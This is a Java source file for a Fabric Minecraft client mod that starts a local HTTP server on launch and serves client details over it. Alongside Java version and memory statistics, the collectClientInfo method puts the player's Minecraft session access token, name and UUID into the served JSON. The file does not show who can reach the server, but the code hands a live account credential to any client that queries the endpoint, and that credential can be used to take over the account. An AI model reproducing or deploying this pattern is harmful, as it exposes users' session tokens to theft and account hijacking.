package com.hydroline.beacon.provider.fabric;

import com.google.gson.JsonObject;
import com.hydroline.beacon.provider.client.ClientHttpServer;
import net.fabricmc.api.ClientModInitializer;
import net.minecraft.client.Minecraft;

public final class BeaconProviderFabricClient implements ClientModInitializer {
    private static ClientHttpServer httpServer;

    @Override
    public void onInitializeClient() {
        httpServer = new ClientHttpServer(this::collectClientInfo);
        httpServer.start();
        
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            if (httpServer != null) {
                httpServer.stop();
            }
        }));
    }

    private JsonObject collectClientInfo() {
        JsonObject json = new JsonObject();
        
        // Java Info
        json.addProperty("java_home", System.getProperty("java.home"));
        json.addProperty("java_version", System.getProperty("java.version"));
        json.addProperty("java_vendor", System.getProperty("java.vendor"));

        // Minecraft Info
        Minecraft mc = Minecraft.getInstance();
        if (mc.getUser() != null) {
            json.addProperty("name", mc.getUser().getName());
            json.addProperty("token", mc.getUser().getAccessToken());
            json.addProperty("uuid", mc.getUser().getUuid());
        }

        // Memory Info
        Runtime runtime = Runtime.getRuntime();
        json.addProperty("memory_max", runtime.maxMemory());
        json.addProperty("memory_total", runtime.totalMemory());
        json.addProperty("memory_free", runtime.freeMemory());
        json.addProperty("memory_used", runtime.totalMemory() - runtime.freeMemory());

        return json;
    }
}
